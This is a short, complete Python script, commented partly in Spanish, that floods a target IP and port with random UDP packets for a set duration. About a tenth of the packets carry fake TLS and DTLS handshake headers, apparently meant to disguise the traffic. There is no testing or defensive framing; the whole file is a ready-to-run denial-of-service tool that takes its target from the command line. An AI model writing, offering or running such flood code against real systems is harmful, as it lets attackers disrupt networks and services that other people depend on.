import socket
import random
import sys
import time

def udp_tls_simple(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Simple TLS handshake patterns (más pequeño)
    tls_patterns = [
        b'\x16\x03\x01',  # TLS 1.0
        b'\x16\x03\x03',  # TLS 1.2
        b'\x16\xfe\xff',  # DTLS
        b'\x16\x03\x01\x00',  # TLS inicio
    ]
    
    timeout = time.time() + duration
    
    packet_count = 0
    
    while time.time() < timeout:
        # 90% UDP normal, 10% TLS handshake
        if random.random() < 0.9:
            # UDP normal flood
            data = random._urandom(random.randint(512, 1024))
        else:
            # TLS handshake (solo ocasionalmente)
            tls_header = random.choice(tls_patterns)
            random_data = random._urandom(random.randint(100, 300))
            data = tls_header + random_data
        
        try:
            sock.sendto(data, (target_ip, target_port))
            packet_count += 1
            
            # Control de velocidad simple
            if packet_count % 100 == 0:
                time.sleep(0.01)
                
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    
    udp_tls_simple(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
